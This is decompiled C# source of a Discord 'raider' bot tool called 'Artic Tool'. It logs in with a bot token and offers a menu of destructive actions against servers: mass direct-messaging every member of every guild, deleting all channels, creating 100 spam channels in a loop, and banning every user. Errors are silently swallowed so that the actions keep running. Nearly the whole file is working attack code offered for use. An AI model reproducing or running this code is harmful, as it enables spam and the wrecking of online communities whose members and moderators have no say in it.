using Discord;
using Discord_Raider_By_Stanley.Properties;
using Discord.Rest;
using Discord.WebSocket;
using System;
using System.Configuration;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

namespace Discord_Raider_By_Stanley
{
	internal class Program
	{
		private static DiscordSocketClient _client;

		private static string _token;

		private static void Main(string[] args)
		{
			//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
			//IL_00c9: Expected O, but got Unknown
			string text = "";
			Console.set_Title("Artic Tool | Made by Haste#2361");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("________________________________________________________________________________________________________________________");
			Console.set_ForegroundColor((ConsoleColor)3);
			if (Settings.Default.Token == "null" || Settings.Default.Token == "")
			{
				Console.Write("Enter BOT Token: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				text = Console.ReadLine();
				Settings.Default.Token = _token;
				((SettingsBase)Settings.Default).Save();
			}
			else
			{
				text = Settings.Default.Token;
			}
			_token = text;
			Console.Clear();
			_client = (DiscordSocketClient)(object)new DiscordSocketClient();
			((BaseDiscordClient)_client).LoginAsync((TokenType)2, text, true);
			_client.add_Ready((Func<Task>)ReadyAsync);
			((BaseDiscordClient)_client).add_Log((Func<LogMessage, Task>)_client_Log);
			_client.StartAsync();
			Thread.Sleep(-1);
		}

		private static Task _client_Log(LogMessage arg)
		{
			Log(((LogMessage)(ref arg)).get_Message(), (ConsoleColor)12);
			return Task.CompletedTask;
		}

		private static void Log(string message, ConsoleColor consoleColor)
		{
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("Loading...");
		}

		private static async Task<Task> ReadyAsync()
		{
			Console.Clear();
			Console.set_Title(" Artic Tool | " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator() + " | Made by Haste#2361");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
			Thread.Sleep(4700);
			Console.Clear();
			Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
			Console.Clear();
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("___________________________________________________________________________________________________________________");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("               [1] Direct Message All      [4] List Bot's Servers       [7] Unban Specific User                     ");
			Console.WriteLine("               [2] Delete All Channels     [5] Create Voice Channels    [8] Twitch Status Changer                   ");
			Console.WriteLine("               [3] Create Text Channels    [6] Ban All                  [9] Game Status Changer                     ");
			Console.set_ForegroundColor((ConsoleColor)3);
			Console.WriteLine("____________________________________________________________________________________________________________________");
			Console.set_ForegroundColor((ConsoleColor)10);
			string mas = Console.ReadLine();
			if (mas == "10")
			{
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("___________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Creator: Haste#2361");
				Console.WriteLine("Designer: Haste#2361");
				Console.WriteLine("Developer: Haste#2361");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("____________________________________________________________________________________________________________________");
				Console.ReadKey();
				await ReadyAsync();
			}
			if (mas == "Haste")
			{
				await _client.SetGameAsync("H", (string)null, (StreamType)0);
				Thread.Sleep(900);
				await _client.SetGameAsync("Ha", (string)null, (StreamType)0);
				Thread.Sleep(900);
				await _client.SetGameAsync("Has", (string)null, (StreamType)0);
				Thread.Sleep(900);
				await _client.SetGameAsync("Hast", (string)null, (StreamType)0);
				Thread.Sleep(900);
				await _client.SetGameAsync("Haste", (string)null, (StreamType)0);
				Thread.Sleep(900);
				FileStream fileStream = new FileStream(Directory.GetCurrentDirectory() + "/Stan.png", FileMode.Open);
				Image image = new Image((Stream)fileStream);
				await _client.get_CurrentUser().ModifyAsync((Action<SelfUserProperties>)delegate(SelfUserProperties u)
				{
					//IL_0002: Unknown result type (might be due to invalid IL or missing references)
					//IL_000c: Unknown result type (might be due to invalid IL or missing references)
					u.set_Avatar(Optional<Image?>.op_Implicit((Image?)image));
				}, (RequestOptions)null);
				await ReadyAsync();
			}
			if (mas == "Credit")
			{
				Console.WriteLine("Development: By Haste");
				Console.WriteLine("Design: By Haste");
			}
			if (mas == "9")
			{
				Console.Clear();
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[9] Game Status Changer");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Enter the Status you want the bot to have: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string name = Console.ReadLine();
				await _client.SetGameAsync(name, (string)null, (StreamType)0);
				await ReadyAsync();
			}
			if (mas == "8")
			{
				Console.Clear();
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[8] Twitch Status Changer");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Enter the Status you want the bot to have: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string a = Console.ReadLine();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Enter the Twitch Link you want the bot to have: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string b = Console.ReadLine();
				await _client.SetGameAsync(a, b, (StreamType)1);
				await ReadyAsync();
			}
			if (mas == "7")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[7] Unban Specific User");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Guild ID : ");
				Console.set_ForegroundColor((ConsoleColor)2);
				string guildid6 = Console.ReadLine();
				ulong id5 = Convert.ToUInt64(guildid6);
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("User ID : ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string userID = Console.ReadLine();
				ulong userid = Convert.ToUInt64(userID);
				SocketGuild guild7 = _client.GetGuild(id5);
				foreach (SocketGuildUser user3 in guild7.get_Users())
				{
					_ = user3;
					try
					{
						await guild7.RemoveBanAsync(userid, (RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				await ReadyAsync();
			}
			if (mas == "6")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[6] Ban All Users");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Guild ID : ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string guildid5 = Console.ReadLine();
				ulong id4 = Convert.ToUInt64(guildid5);
				SocketGuild guild6 = _client.GetGuild(id4);
				foreach (SocketGuildUser user2 in guild6.get_Users())
				{
					try
					{
						await guild6.AddBanAsync((IUser)(object)user2, 0, "Using ", (RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				await ReadyAsync();
			}
			if (mas == "5")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[5] Create Voice Channels");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Server ID : ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string guildid4 = Console.ReadLine();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Voice Channel Name : ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string textchan2 = Console.ReadLine();
				ulong id3 = Convert.ToUInt64(guildid4);
				SocketGuild guild5 = _client.GetGuild(id3);
				for (int j = 0; j < 100; j++)
				{
					try
					{
						await guild5.CreateVoiceChannelAsync(textchan2.Replace(' ', '-'), (RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				await ReadyAsync();
			}
			if (mas == "4")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[4] List Bot's Servers");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				foreach (SocketGuild guild4 in _client.get_Guilds())
				{
					Console.WriteLine("+ Name : " + guild4.get_Name() + " | ID : " + ((SocketEntity<ulong>)(object)guild4).get_Id() + " | Owner : " + (object)guild4.get_Owner());
				}
				Console.ReadKey();
				await ReadyAsync();
			}
			if (mas == "3")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[3] Create Text Channels");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Server ID: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string guildid3 = Console.ReadLine();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Text Channel Name: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string textchan = Console.ReadLine();
				ulong id2 = Convert.ToUInt64(guildid3);
				SocketGuild guild3 = _client.GetGuild(id2);
				for (int i = 0; i < 100; i++)
				{
					try
					{
						await guild3.CreateTextChannelAsync(textchan.Replace(' ', '-'), (RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				await ReadyAsync();
			}
			if (mas == "2")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[2] Delete All Channels");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("Guild ID: ");
				Console.set_ForegroundColor((ConsoleColor)3);
				string guildid2 = Console.ReadLine();
				Console.set_ForegroundColor((ConsoleColor)3);
				ulong id = Convert.ToUInt64(guildid2);
				SocketGuild guild2 = _client.GetGuild(id);
				foreach (SocketTextChannel chan in guild2.get_TextChannels())
				{
					try
					{
						await ((SocketGuildChannel)chan).DeleteAsync((RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				foreach (SocketVoiceChannel chanv in guild2.get_VoiceChannels())
				{
					try
					{
						await ((SocketGuildChannel)chanv).DeleteAsync((RequestOptions)null);
					}
					catch (Exception)
					{
					}
				}
				await ReadyAsync();
			}
			if (mas == "1")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[1] Direct Message All");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.Write("DMALL Message: ");
				Console.set_ForegroundColor((ConsoleColor)10);
				string DMALL2 = Console.ReadLine();
				foreach (SocketGuild guild in _client.get_Guilds())
				{
					foreach (SocketGuildUser user in guild.get_Users())
					{
						try
						{
							await UserExtensions.SendMessageAsync((IUser)(object)user, DMALL2, false, (Embed)null, (RequestOptions)null);
						}
						catch (Exception)
						{
							Console.set_ForegroundColor((ConsoleColor)12);
							Console.WriteLine("Cannot send : 1 : message");
						}
					}
					await ReadyAsync();
				}
			}
			if (mas == "019289089218578")
			{
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Successfully Logged in as: " + ((SocketUser)_client.get_CurrentUser()).get_Username() + "#" + ((SocketUser)_client.get_CurrentUser()).get_Discriminator());
				Console.Clear();
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("\t\r\n\t   ▄████████    ▄████████     ███      ▄█   ▄████████          ███      ▄██████▄   ▄██████▄   ▄█   \r\n\t  ███    ███   ███    ███ ▀█████████▄ ███  ███    ███      ▀█████████▄ ███    ███ ███    ███ ███  \r\n\t  ███    ███   ███    ███    ▀███▀▀██ ███▌ ███    █▀          ▀███▀▀██ ███    ███ ███    ███ ███  \r\n\t  ███    ███  ▄███▄▄▄▄██▀     ███   ▀ ███▌ ███                 ███   ▀ ███    ███ ███    ███ ███  \r\n\t▀███████████ ▀▀███▀▀▀▀▀       ███     ███▌ ███                 ███     ███    ███ ███    ███ ███\r\n\t  ███    ███ ▀███████████     ███     ███  ███    █▄           ███     ███    ███ ███    ███ ███ \r\n\t  ███    ███   ███    ███     ███     ███  ███    ███          ███     ███    ███ ███    ███ ███▌    ▄ \r\n\t  ███    █▀    ███    ███    ▄████▀   █▀   ████████▀          ▄████▀    ▀██████▀   ▀██████▀  █████▄▄██ \r\n\t               ███    ███                                                                    ▀   \r\n\t\t\t\t");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("[1] Leave");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("________________________________________________________________________________________________________________________");
				Console.set_ForegroundColor((ConsoleColor)3);
				Console.WriteLine("Leave message : ");
				Console.set_ForegroundColor((ConsoleColor)3);
			}
			return Task.CompletedTask;
		}
	}
}
